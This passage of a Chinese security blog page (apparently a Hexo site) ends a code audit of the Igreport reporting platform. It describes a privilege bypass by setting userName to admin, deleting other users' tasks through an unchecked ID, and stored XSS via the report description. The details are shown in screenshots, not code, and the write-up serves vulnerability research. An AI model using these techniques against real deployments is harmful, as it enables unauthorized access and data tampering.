+<p>将userName改成admin即可。</p>
+<p><img src="/../../blog_image/image-20240623192158419-1719145846393-113.png" srcset="/img/loading.gif" lazyload alt="image-20240623192158419"></p>
+<h3 id="4-3-越权删除任意用户任务："><a href="#4-3-越权删除任意用户任务：" class="headerlink" title="4.3 越权删除任意用户任务："></a>4.3 越权删除任意用户任务：</h3><p>当前存在的admin创建报表为6：</p>
+<p><img src="/../../blog_image/image-20240623201154287-1719145846393-117.png" srcset="/img/loading.gif" lazyload alt="image-20240623201154287"></p>
+<p>当前的用户为test，尝试删除管理员的任务：</p>
+<p><img src="/../../blog_image/image-20240623201237513-1719145846393-114.png" srcset="/img/loading.gif" lazyload alt="image-20240623201237513"></p>
+<p>删除成功：</p>
+<p><img src="/../../blog_image/image-20240623201250478-1719145846393-115.png" srcset="/img/loading.gif" lazyload alt="image-20240623201250478"></p>
+<p>漏洞产生原因：</p>
+<p><img src="/../../blog_image/image-20240623201305545-1719145846393-116.png" srcset="/img/loading.gif" lazyload alt="image-20240623201305545"></p>
+<p>前端传入的id后，没有对当前id进行校验。</p>
+<h2 id="5-xss："><a href="#5-xss：" class="headerlink" title="5. xss："></a>5. xss：</h2><p>我们查看日志中会看到，将我们的报表数据打印到日志中，因此可以推测是否存在xss？</p>
+<p>首先判断是否存在过滤器和拦截器，全局搜索<code>HandlerInterceptorAdapter</code>和<code>Filter</code></p>
+<p>都是权限校验的拦截器：</p>
+<p><img src="/../../blog_image/image-20240623193227151-1719145846393-118.png" srcset="/img/loading.gif" lazyload alt="image-20240623193227151"></p>
+<p>首先尝试修改报表名称，发现存在校验，即只能输入英文或这是数字的，因此修改报表描述：</p>
+<p><img src="/../../blog_image/image-20240623192922392-1719145846393-121.png" srcset="/img/loading.gif" lazyload alt="image-20240623192922392"></p>
+<p>点击日志后成功弹出xss：</p>
+<p><img src="/../../blog_image/image-20240623195715025-1719145846393-120.png" srcset="/img/loading.gif" lazyload alt="image-20240623195715025"></p>
+<p>漏洞产生原理：</p>
+<p>添加了任务后查看日志，会调用logDetailCat查看日志信息：</p>
+<p><img src="/../../blog_image/image-20240623200221097-1719145846393-119.png" srcset="/img/loading.gif" lazyload alt="image-20240623200221097"></p>
+<p>但是没有对传入的数据进行校验，最终产生了xss。</p>
+<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a target="_blank" rel="noopener" href="https://bbs.huaweicloud.com/blogs/398912#H26">JAVA代码审计-企业级通用报表平台-云社区-华为云 (huaweicloud.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/LYL41011/igreport">LYL41011&#x2F;igreport: SpringBoot+Vue 企业级 智能通用报表 调度平台 管理系统 (github.com)</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="category-chain-item">代码审计</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java%E5%AE%89%E5%85%A8/" class="print-no-link">#java安全</a>
+      
+        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#代码审计</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Igreport报表系统代码审计</div>
+      <div>https://pow1e.github.io/2024/06/23/代码审计/Igreport报表系统代码审计/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>pow1e</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年6月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/31/%E5%85%8D%E6%9D%80/webshell%E5%85%8D%E6%9D%80%E4%B9%8Bjsp/" title="webshell免杀之jsp">
+                        <span class="hidden-mobile">webshell免杀之jsp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
